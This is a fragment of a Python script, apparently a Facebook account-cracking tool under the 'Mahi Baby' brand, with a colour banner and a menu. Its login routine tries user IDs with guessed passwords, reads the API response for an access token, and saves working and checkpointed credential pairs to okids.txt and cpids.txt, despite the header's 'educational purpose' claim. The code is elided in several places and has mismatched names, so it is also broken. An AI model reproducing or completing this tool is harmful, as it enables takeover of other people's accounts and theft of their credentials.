#Script Given By Mahi BABY 
#Script Is Given For Educational Purpose
#Script Edited By @ITZ MAHI BABY
#Utf-8 python 
...
Mahi = ['Op Bolty','Good Jani','Keep It Up ','Wah Bhai','Kia Baat Hy ','Aag Lga Di','Tu Baqio Sy Alag Hy Vro','Agar May Larki Hota Toh Tuj sy Shaadi Krta ','Ha Chikny Lub u']
mahibaby = random.choice(qaiser)
agents = [
...
\n\033[0m----------------------------------
\033[1;92mAuthor \033[1;93m: AL HAMIM MAHI
\033[1;92mFb \033[1;93m: AL HAMIM 
\033[1;92mDisclaimer \033[1;93m: IT'S NOT JUST A NAME, IT'S A BRAND
\033[0m----------------------------------
...
def log_sel():
    ...
    if select == '1':
        ...
        os.system('xdg-open https://www.facebook.com/Itx-Mahi-Baby-107168981954845/')
        main()
    elif select == '0':
        os.system('exit')
    elif select == '3':
    ...
    def main(arg):
        ...
        try:
            ...
            if 'access_token' in q:
                ...
                q = json.loads(data)
                if 'access_token' in q:
                    print '\x1b[1;32m[MAHIVAU-OK]\033[0m ' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    ok = open('okids.txt', 'a')
                    ok.write(uid + '|' + pass2 + '\n')
                    ok.close()
                    oks.append(uid + pass2)
                elif 'www.facebook.com' in q['error_msg']:
                    print '\x1b[1;31m[MAHIVAU-CP] \033[0m' + uid + ' | ' + pass2 + '\x1b[0;97m'
                    cp = open('cpids.txt', 'a')
                    cp.write(uid + '|' + pass2 + '\n')
                    cp.close()
